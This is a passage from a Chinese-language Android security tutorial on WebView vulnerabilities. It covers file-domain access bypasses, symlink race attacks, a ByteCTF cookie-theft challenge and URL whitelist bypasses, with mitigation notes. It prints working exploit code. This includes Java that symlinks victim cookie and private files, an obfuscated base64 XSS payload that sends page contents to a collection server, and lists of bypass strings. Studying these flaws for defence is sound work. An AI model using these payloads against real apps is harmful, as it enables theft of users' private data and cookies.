class="line">        &#123;</span><br><span class="line">              console.log(xmlhttp.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我们将文件上传到手机的目录</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/38.png" alt="image-20220729200249055"></p><p>接着我们编写攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这是程序肯定会报错误，因为Android4.1后就默认禁止<code>setAllowFileAccessFromFileURLs(true)</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/39.png" alt="image-20220729200625192"></p><p>然后我们开启<code>setAllowFileAccessFromFileURLs</code>按钮，再次执行</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/40.png" alt="image-20220729200745980"></p><p>我们可以发现现在的Android版本中开始删除了这样的API，这是为了安全性，不过这里我们还是可以使用，于是我们开启API</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/41.png" alt="image-20220729201027637"></p><p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p><h4 id="（2）通用协议漏洞-（恶意页面注入）"><a href="#（2）通用协议漏洞-（恶意页面注入）" class="headerlink" title="（2）通用协议漏洞 （恶意页面注入）"></a>（2）通用协议漏洞 （恶意页面注入）</h4><p><strong>漏洞原理：</strong></p><p><code>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</code></p><p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</p><p>我们将上面html中的访问改为看雪的网站：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xmlhttp;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">loadXMLDoc</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后开启setAllowUniversalAccessFromFileURLs 函数API,并运行</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/42.png" alt="image-20220729202020754"></p><p>我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入</p><p><strong>安全防护:</strong></p><ul><li>检查应用是否使用了 webview 控件；</li><li>避免 App 内部的 WebView 被不信任的第三方调用，排查内置 WebView 的 Activity 是否被导出、必须导出的 Activity 是否会通过参数传递调起内置的WebView等；</li><li>file 域访问为非功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li></ul><p>若需要开启 file 域访问，则设置 file 路径的白名单，严格控制 file 域的访问范围，具体如下：</p><ul><li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:&#x2F;&#x2F;&#x2F;android_asset 和 file:&#x2F;&#x2F;&#x2F;android_res 在不开启 API 的情况下也可以访问；</li><li>可能会更新的 HTML 文件放在 &#x2F;data&#x2F;data&#x2F;(app) 目录下，避免被第三方替换或修改；</li><li>对 file 域请求做白名单限制时，需要对“…&#x2F;…&#x2F;”特殊情况进行处理，避免白名单被绕过。</li></ul><h4 id="（3）符号链接跨源攻击"><a href="#（3）符号链接跨源攻击" class="headerlink" title="（3）符号链接跨源攻击"></a>（3）符号链接跨源攻击</h4><p>我们回顾2020SDC中研究提到的这类漏洞，只有<strong>setAllowFileAccess为True</strong></p><p><strong>漏洞原理：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/43.png" alt="image-20220729202532795"></p><p>其攻击过程首先是操纵WebView去访问一个攻击APP自己公开出来的网页，然后这个网页执行的内容其实就是延时去读取自身。在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件，最终读取窃取其内容。</p><p>具体攻击步骤:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（在该命令执行前 xx.html 是不存在的；执行完这条命令之后，就生成了这个文件，并且将 Cookie 文件链接到了 xx.html 上。）</span><br><span class="line"><span class="number">1.</span> 把恶意的 js 代码输出到攻击应用的目录下，随机命名为 xx.html，修改该目录的权限；\</span><br><span class="line"><span class="number">2.</span> 修改后休眠 1s，让文件操作完成；\</span><br><span class="line"><span class="number">3.</span> 完成后通过系统的 Chrome 应用去打开该 xx.html 文件\</span><br><span class="line"><span class="number">4.</span> 等待 4s 让 Chrome 加载完成该 html，最后将该 html 删除，并且使用 ln -s 命令为 Chrome 的 Cookie 文件创建软连接，\</span><br><span class="line">于是就可通过链接来访问 Chrome 的 Cookie</span><br></pre></td></tr></table></figure><p><strong>漏洞复现：</strong></p><p>这里由于该漏洞在Android7.0版本上已经修复了，所以这里我引用大佬的博客来进行描述，大家具体可以按照步骤在Android7.0以下的版本上去复现，参考文章：<a href="https://blog.csdn.net/qq_35993502/article/details/121371049">Android安全检测－WebView File域同源策略绕过漏洞</a></p><p>构造HTML文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#恶意<span class="variable constant_">APP</span>的<span class="variable constant_">HTML</span>,被检测<span class="variable constant_">APP</span>加载此html，执行<span class="variable constant_">JS</span>代码</span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">var d = document;</span></span><br><span class="line"><span class="language-xml">function loadDatabase()</span></span><br><span class="line"><span class="language-xml">&#123;</span></span><br><span class="line"><span class="language-xml">    var file_url = d.URL;</span></span><br><span class="line"><span class="language-xml">    var xmlhttp =new XMLHttpRequest();</span></span><br><span class="line"><span class="language-xml">    xmlhttp.onload=function() &#123;</span></span><br><span class="line"><span class="language-xml"> document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span></span><br><span class="line"><span class="language-xml">    alert(xmlhttp.responseText);</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">    xmlhttp.open(&quot;GET&quot;,file_url);</span></span><br><span class="line"><span class="language-xml">    xmlhttp.send(null);</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml">setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>构造恶意APP的攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的攻击代码</span><br><span class="line">  <span class="keyword">try</span> &#123; </span><br><span class="line">  <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;恶意APP的HTML,在上面的HTML代码&quot;</span>;</span><br><span class="line">  #新建文件夹，用于存放恶意HTML文件</span><br><span class="line">       cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">       #将恶意HTML到恶意APP的沙盒目录</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #授权目录及其文件权限，允许其它应用访问</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #启动被攻击的APP，并携带恶意HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #延时<span class="number">6</span>秒</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #删除HTML文件</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #软链接文件，实现读取被攻击应用的<span class="keyword">private</span>.txt文件</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目标样本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#被攻击的APP，有漏洞的代码</span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  允许加载File域</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #取出了恶意HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #加载了恶意HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png" alt="image-20220729205923022"></p><p><strong>安全防护：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、设置setAllowFileAccess方法为<span class="literal">false</span>,设置setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs为<span class="literal">false</span>。</span><br><span class="line"><span class="number">2</span>、在Android4<span class="number">.0</span>(API15)及以下得采用其他方法进行手动校验是否访问file域</span><br><span class="line"><span class="number">3</span>、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露</span><br></pre></td></tr></table></figure><h4 id="（4）污染Cooike漏洞"><a href="#（4）污染Cooike漏洞" class="headerlink" title="（4）污染Cooike漏洞"></a>（4）污染Cooike漏洞</h4><p>本漏洞参考：<a href="http://www.ctfiot.com/39656.html">Android-Webview中的漏洞利用总结</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/44.png" alt="image-20220729210229976"></p><p><strong>漏洞原理：</strong></p><p>攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike，如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/74.png" alt="image-20220730141203355"></p><p><strong>漏洞复现：</strong></p><p>首先创建了符号链接，然后过URL校验，访问我们的服务器<code>http://ip地址/easydroid.html</code>:</p><p>建立一个easydroid.html，它里面有两个重定向：一个是设置Cookie，一个是加载与Cookies文件符号链接后的那个html文件</p><p><code>easydroid.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>injected cookie with xss<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;sendData = &#x27;&lt;img src=\&quot;evil\&quot; onerror=\&quot;eval(atob(&#x27;dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw==&#x27;))\&quot;&gt;&#x27;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> baseUrl = <span class="string">&quot;http://****/MyTest/ReceiveServlet?&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = baseUrl + <span class="string">&quot;cookie=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&quot;open evil page.&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">     <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">         location.<span class="property">href</span> = <span class="string">&#x27;intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">     &#125;, <span class="number">40000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    symlink();</span><br><span class="line">    Intent intent \= <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">    intent.setData(Uri.parse(<span class="string">&quot;http://toutiao.com@****/easydroid.html&quot;</span>));</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">symlink</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    String root \= getApplicationInfo().dataDir;</span><br><span class="line">    String symlink \= root + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">    String cookies \= getPackageManager().getApplicationInfo(<span class="string">&quot;com.bytectf.easydroid&quot;</span>, <span class="number">0</span>).dataDir + <span class="string">&quot;/app_webview/Cookies&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;rm &quot;</span> + symlink).waitFor();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;ln -s &quot;</span> + cookies + <span class="string">&quot; &quot;</span> + symlink).waitFor();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;chmod -R 777 &quot;</span> + root).waitFor();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> symlink;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(th);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过Intent重定向，首先加载exp.html来设置cookie，然后再加载symlink.html，将所要Cookies内容返回给我们的服务器。最终达到窃取Cookies的目的。注意，这里要保证setAllowFileAccess(true)，API 29以下默认为true，否则会利用失败</p><p>效果显示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/75.png" alt="image-20220730141455146"></p><h3 id="3-URL配置漏洞"><a href="#3-URL配置漏洞" class="headerlink" title="3.URL配置漏洞"></a>3.URL配置漏洞</h3><p>在WebView漏洞中，许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞</p><p>URL的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://login:password@address:port/path/to/resource/?query_string#fragment</span><br></pre></td></tr></table></figure><ul><li>scheme<br>不区分大小写，包括http、https、file、ftp等等,:之后的“&#x2F;&#x2F;”可省略，例如http:<a href="http://www.qq.com/">www.qq.com</a>, 此外，多数浏览器在scheme之前加空格也是可以正常解析的</li><li>login:password@（认证信息）<br>服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查</li><li>address<br>address字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li><li>port<br>端口号</li><li>&#x2F;path&#x2F;to&#x2F;resource<br>层级路径，可以使用“..&#x2F;”到上一级目录</li><li>query_string<br>查询字符串，格式为”query_string?name1&#x3D;value1&amp;name2&#x3D;value2”</li><li>fragment<br>用于html中的页面定位</li></ul><h4 id="（1）URL绕过漏洞"><a href="#（1）URL绕过漏洞" class="headerlink" title="（1）URL绕过漏洞"></a>（1）URL绕过漏洞</h4><p><strong>漏洞原理：</strong></p><h5 id="lt-1-gt-通用的URL绕过"><a href="#lt-1-gt-通用的URL绕过" class="headerlink" title="&lt;1&gt;通用的URL绕过"></a>&lt;1&gt;通用的URL绕过</h5><p>首先我们来看一个简单的url校验例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">enableJavaScriptInterface();</span><br><span class="line"><span class="comment">//或者webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是对url进行域名校验，然后开启我们的<code>enableJavaScriptInterface</code>接口可以访问js文件</p><p>我们在实际中会发现这样的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里是开发者为了防止加载file的同源策略进行的防护，但是我们有很多的绕过方法：</p><p>总结：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 大写字母 “File:<span class="comment">//”</span></span><br><span class="line">(<span class="number">2</span>) 前面加上空格： “ file:<span class="comment">//”</span></span><br><span class="line">(<span class="number">3</span>) 字符编码：“file：%<span class="number">2F</span>/”</span><br><span class="line">(<span class="number">4</span>) 可正常访问的畸形路径：“file:sdcard/attack/html” 或 “file:/\<span class="comment">//sdcard/attack.html”</span></span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-常见的url校验"><a href="#lt-2-gt-常见的url校验" class="headerlink" title="&lt;2&gt; 常见的url校验"></a>&lt;2&gt; 常见的url校验</h5><p>我们还可以发现在一般的url中会对首尾进行校验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.endsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">enableJavascriptInterface();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在问题：endWith未闭合点号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过：evilmysite.com</span><br><span class="line">修复：endsWith(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>使⽤startsWith、contains、indexOf、正则匹配等⾮严格字符串匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">enableJavascriptInterface();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过：mysite.com@oppo.com</span><br></pre></td></tr></table></figure><p><strong>contains+indexOf绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">任何可以添加字符串的字段</span><br><span class="line">子域名 huawei.com.mysite.com</span><br><span class="line">子路径 mysite.com/huawei.com</span><br><span class="line">参数 mysite.com/xxxx#huawei.com</span><br></pre></td></tr></table></figure><p><strong>&#x2F;&#x2F;和第一个&#x2F;之间提取host</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span 